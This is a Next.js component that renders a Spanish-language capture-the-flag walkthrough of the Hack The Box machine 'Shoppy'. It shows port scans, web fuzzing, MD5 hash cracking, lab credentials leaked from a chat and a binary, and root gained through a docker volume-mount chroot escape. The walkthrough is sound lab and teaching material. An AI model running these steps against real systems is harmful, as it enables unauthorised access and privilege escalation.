import { Highlighter } from '../../utils/SyntaxHighlighter'
import { Paragraph } from '../../Components/Paragraph'
import { ContentBlock } from '../../Layout/ContentBlock'
import { SubTitle } from '../../Components/SubTitle'
import { Anchor } from '../../Components/Anchor'
import Image from 'next/image'

export function Shoppy () {
  return (
    <>
      <ContentBlock>
        <SubTitle>Rust Scan</SubTitle>
        <Paragraph>
          Empezamos con un escaneo de todos los puertos con <Anchor src='https://github.com/RustScan/RustScan'>RustScan</Anchor>.
        </Paragraph>
        <Highlighter
          text={`
❯ rustscan -a 10.10.11.180 -- -sS -n -Pn
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

Open 10.10.11.180:22
Open 10.10.11.180:80
Open 10.10.11.180:9093
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.92
Initiating SYN Stealth Scan at 16:21
Scanning 10.10.11.180 [3 ports]
Discovered open port 22/tcp on 10.10.11.180
Discovered open port 9093/tcp on 10.10.11.180
Discovered open port 80/tcp on 10.10.11.180
Completed SYN Stealth Scan ** elapsed (3 total ports)
Nmap scan report for 10.10.11.180
Host is up, received user-set (0.24s latency).

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
9093/tcp open  copycat syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 4.00 seconds
  Raw packets sent: 3 (queteimportaB) | Rcvd: 3 (queteimportaB)
          `}
        />
        <Paragraph>Descubrimos tres puertos abiertos, proseguimos con el siguiete escaneo</Paragraph>
        <Highlighter
          text={`
❯ rustscan -a 10.10.11.180 -p22,80,9093 -- -sCV
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

Open 10.10.11.180:22
Open 10.10.11.180:80
Open 10.10.11.180:9093
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
...
Initiating Connect Scan at 16:26
Scanning shoppy.htb (10.10.11.180) [3 ports]
Discovered open port 22/tcp on 10.10.11.180
Discovered open port 80/tcp on 10.10.11.180
Discovered open port 9093/tcp on 10.10.11.180
Initiating Service scan at 16:26
Scanning 3 services on shoppy.htb (10.10.11.180)
Completed Service scan at 16:27, 105.34s elapsed (3 services on 1 host)
Nmap scan report for shoppy.htb (10.10.11.180)
Host is up, received syn-ack (0.21s latency).
Scanned at 2022-09-22 16:26:14 -04 for 115s

PORT     STATE SERVICE  REASON  VERSION
22/tcp   open  ssh      syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDApZi3Kltv1yDHTatw6pKZfuIcoHfTnVe0W1yc9Uw7NMUinxjjQaQ731J+eCTwd8hBcZT6HQwcchDNR50Lwyp2a/KpXuH2my+2/tDvISTRTgwfMy1sDrG3+KPEzBag07m7ycshp8KhrRq0faHPrEgcagkb5T8mnT6zr3YonzoMyIpT+Q1O0JAre6GPgJc9im/tjaqhwUxCH5MxJCKQxaUf2SlGjRCH5/xEkNO20BEUYokjoAWwHUWjK2mlIrBQfd4/lcUzMnc5WT9pVBqQBw+/7LbFRyH4TLmGT9PPEr8D8iygWYpuG7WFOZlU8oOhO0+uBqZFgJFFOevq+42q42BvYYR/z+mFox+Q2lz7viSCV7nBMdcWto6USWLrx1AkVXNGeuRjr3l0r/698sQjDy5v0GnU9cMHeYkMc+TuiIaJJ5oRrSg/x53Xin1UogTnTaKLNdGkgynMqyVFklvdnUngRSLsXnwYNgcDrUhXxsfpDu8HVnzerT3q27679+n5ZFM=
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHiKrH/B/4murRCo5ju2KuPgkMjQN3Foh7EifMHEOwmoDNjLYBfoAFKgBnrMA9GzA+NGhHVa6L8CAxN3eaGXXMo=
|   256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBRsWhJQCRHjDkHy3HkFLMZoGqCmM3/VfMHMm56u0Ivk
80/tcp   open  http     syn-ack nginx 1.23.1
|_http-title:             Shoppy Wait Page        
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: D5F0A0ADD0BFBB2BC51607F78ECE2F57
|_http-server-header: nginx/1.23.1
9093/tcp open  copycat? syn-ack
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     ...
|     ...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.78 seconds
          `}
        />
        <Paragraph>
          vemos el puerto <i>ssh</i>, una web en el puerto 83 que corre nginx 1.23 y una posible DB en el 9093, ingresamos a la Web.
        </Paragraph>
        <Image
          fill='responsive'
          width={729}
          height={427}
          src='https://res.cloudinary.com/djc1umong/image/upload/v1663900749/shoppy_htb_1_nysk1g.webp'
        />
        <Paragraph>
          vemos un contador, y nada en el código fuente. Intentemos empezando por un fuzzing a <i>shoppy.htb/FUZZ</i> y buscar subdominios en
          <i>FUZZ.shoppy.htb</i>.
        </Paragraph>
        <Highlighter
          text={`
❯ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://shoppy.htb/FUZZ -fw 853 

v1.5.0-dev
________________________________________________

:: Method           : GET
:: URL              : http://shoppy.htb/FUZZ
:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
:: Filter           : Response words: 853
________________________________________________

images                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 848ms]
login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 204ms]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 168ms]
assets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 162ms]
css                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 166ms]
Login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 173ms]
js                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 162ms]
          `}
        />
        <Paragraph>
          encontramos un apartado login y admin que son interesantes 📄, admin nos devuelve un estado 302 desde el servidor y login uno exitoso. Ingresamos a <i>/login</i>.
        </Paragraph>
        <Paragraph>
          después de jugar con el formulario, la URL y por un posible <Anchor src='https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/'>Path Traversal</Anchor>, descubrimos que podemos Inyectar SQL 💉.
        </Paragraph>
        <Image
          fill='responsive'
          width={566}
          height={740}
          src='https://res.cloudinary.com/djc1umong/image/upload/v1663900750/shoppy_login_3_lnbvg4.webp'
        />
        <Paragraph>
          la página nos permite interactuar con <i>Search for Users</i>, buscamos por nuestro query. Y damos clic en <i>Download Export</i> 📥.
        </Paragraph>
        <Image
          fill='responsive'
          width={881}
          height={570}
          src='https://res.cloudinary.com/djc1umong/image/upload/v1663900749/shoppy_admin_searchuser_4_n89fpf.webp'
        />

        <Image
          fill='responsive'
          width={905}
          height={292}
          src='https://res.cloudinary.com/djc1umong/image/upload/v1663900749/shoppy_admin_download_5_z6poel.webp'
        />
        <Image
          fill='responsive'
          width={618}
          height={372}
          src='https://res.cloudinary.com/djc1umong/image/upload/v1663900749/shoppy_export_json_6_gepqeb.webp'
        />
        <Paragraph>
          vemos dos usuarios con sus contraseñas seguramente encriptadas(md5) toca sacar el <i>hashcat</i> o el <i>john</i>, ingresamos los hashes a nuestro archivo hash y proseguimos de manera sencilla...
        </Paragraph>

        <Highlighter
          text={`
❯ cat hash
23c6877d9e2b564ef8b32c3a23de27b2
6ebcea65320589ca4f2f1ce039975995
❯ hashcat hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...
...
Session..........: hashcat
Status...........: Exhausted
Hash.Name........: MD5
Hash.Target......: hash
Time.Started.....: * (2 secs)
Time.Estimated...: * (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7415.3 kH/s (0.27ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/2 (50.00%) Digests
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]

Started: *
Stopped: *

c/htb/shoppy took 17s 
❯ hashcat hash /usr/share/wordlists/rockyou.txt --show
6ebcea65320589ca4f2f1ce039975995:remembermethisway
          `}
        />
        <Paragraph>
          ✨hash ROTO❤️ <i>remembermethisway</i> contraseña para el usuario <i>josh</i>.
          Cuando empezamos a hacer fuzzing a <i>http://shoppy/login</i> no es mala idea también hacerlo a <i>http://FUZZ.shoppy.login</i>.
        </Paragraph>
        <Highlighter
          text={`
❯ ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://shoppy.htb -H "Host: FUZZ.shoppy.htb" -fw 5
...
________________________________________________

  :: Method           : GET
  :: URL              : http://shoppy.htb
  :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
  :: Header           : Host: FUZZ.shoppy.htb
  :: Follow redirects : false
  :: Calibration      : false
  :: Timeout          : 10
  :: Threads          : 40
  :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
  :: Filter           : Response words: 5
________________________________________________
mattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 190ms]
          `}
        />
        <Image
          fill='responsive'
          width={1114}
          height={432}
          src='https://res.cloudinary.com/djc1umong/image/upload/v1663900749/shoopy_josh_login_7_vkxaue.webp'
        />
        <Paragraph>
          tenemos un login y un usuario <i>josh </i> con contraseña <i>remembermethisway</i>.
        </Paragraph>
        <Image
          fill='responsive'
          width={987}
          height={799}
          src='https://res.cloudinary.com/djc1umong/image/upload/v1663900749/shoppy_josh_panel_8_d1efwq.webp'
        />
        <Paragraph>
          vemos cuatro apartados que son interesantes que los leas yo te lo resumiré:
        </Paragraph>
        <ul>
          <li>Sabemos que Jess tiene un gato Tigrou 🐈.</li>
          <li>El usuario Jaeger nos dijo que hay una máquina llamada <i>deploy</i> y nos pasó sus credenciales <i>username: jaeger
            password: Sh0ppyBest@pp!
                                                                                                               </i>.
          </li>
          <li>Van a usar docker para el despliegue. 🎁 </li>
          <li>EL usuario Josh está aprendiendo c++ y hay un archivo password-manager.</li>
        </ul>
        <Paragraph>
          Ingresamos por ssh:
        </Paragraph>
        <Highlighter
          text={`
❯ ssh jaeger@shoppy.htb
❯ jaeger@shoppy.htb's password: 
❯ jaeger@shoppy:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  ShoppyApp  Templates  Videos  script  shoppy_start.sh  user.txt
❯ jaeger@shoppy:~$ cat user.txt
*********************
❯ jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
          `}
        />
        <Paragraph>
          podemos ejecutar un archivo <i>/home/deploy/password-manager</i> con el usuario deploy
        </Paragraph>
        <Highlighter
          text={`
❯ ssh jaeger@shoppy.htb
❯ jaeger@shoppy.htb's password: 
❯ jaeger@shoppy:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  ShoppyApp  Templates  Videos  script  shoppy_start.sh  user.txt
❯ jaeger@shoppy:~$ cat user.txt
*********************
❯ jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
  env_reset, mail_badpass, secure_path=/usr/local/sbn\\::/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\::/bin

❯ jaeger@shoppy:/home/deploy$ ls -lah
total 84K
drwxr-xr-x 5 deploy deploy 4.0K Sep 22 16:44 .
drwxr-xr-x 4 root   root   4.0K Jul 22 13:12 ..
lrwxrwxrwx 1 deploy deploy    9 Jul 22 13:14 .bash_history -> /dev/null
-rw-r--r-- 1 deploy deploy  220 Mar 27 13:40 .bash_logout
-rw-r--r-- 1 deploy deploy 3.5K Mar 27 13:40 .bashrc
lrwxrwxrwx 1 deploy deploy    9 Jul 23 03:34 .dbshell -> /dev/null
drwx------ 3 deploy deploy 4.0K Sep 22 14:50 .gnupg
drwxr-xr-x 3 deploy deploy 4.0K Sep 22 16:43 .local
-rw-r--r-- 1 deploy deploy  807 Mar 27 13:40 .profile
drwx------ 2 deploy deploy 4.0K Sep 22 14:55 .ssh
-rw------- 1 deploy deploy   56 Jul 22 13:15 creds.txt
-rwxr--r-- 1 deploy deploy  19K Jul 22 13:20 password-manager
-rw------- 1 deploy deploy  739 Feb  1  2022 password-manager.cpp
-rwsr-xr-x 1 deploy deploy  17K Sep 22 16:44 shell
-rw-r--r-- 1 deploy deploy   76 Sep 22 16:44 test.c
          `}
        />
        <Paragraph>
          tenemos permisos de lectura a password-manager lo cual es interesante 💅🏻, vemos que tipo de archivo es antes de seguir con <i>file</i>: Es un binario LSB ejecutable.
        </Paragraph>
        <Highlighter
          text={`
❯ jaeger@shoppy:/home/deploy$ file password-manager
password-manager: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f343348080d2905d1, for GNU/Linux 3.2.0, not stripped

❯ jaeger@shoppy:/home/deploy$ cat password-manager
...Welcome to Josh password manager!Please enter your master password: SampleAccess granted!... 
          `}
        />
        <Paragraph>
          De toda la tralla que nos boto el comando <i>cat</i> se filtró una contraseña <i>Sample</i>, proseguimos con el usuario deploy que tiene acceso al contenedor docker:
        </Paragraph>
        <Highlighter
          text={`
❯ jaeger@shoppy:/home/deploy$ sudo -u deploy ./password-manager
[sudo] password for jaeger: 
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
❯ jaeger@shoppy:/home/deploy$ ssh deploy@shoppy.htb
deploy@shoppy.htb's password: 
...
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
...
❯$ whoami
deploy
❯$ docker container ls
CONTAINER ID   IMAGE     COMMAND            CREATED         STATUS         PORTS     NAMES
ffe961feb55a   alpine    "chroot /mnt sh"   2 minutes ago   Up 2 minutes             festive_torvalds
          `}
        />
        <Paragraph>
          vemos una imagen alpine que permite hacer root a <i>/mnt</i> si podemos montar toda la raíz en nuestro fichero, seremos root.
          🌴 El flag -v es de volum que es parecido a mount en Docker.
        </Paragraph>
        <Highlighter
          text={`
❯$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
❯# whoami
root
❯# cat /root/root.txt
**********************************
          `}
        />
        <Image
          fill='responsive'
          width={703}
          height={806}
          src='https://res.cloudinary.com/djc1umong/image/upload/v1663900750/shoppy_pwned_uwfliq.webp'
        />
      </ContentBlock>
    </>
  )
}
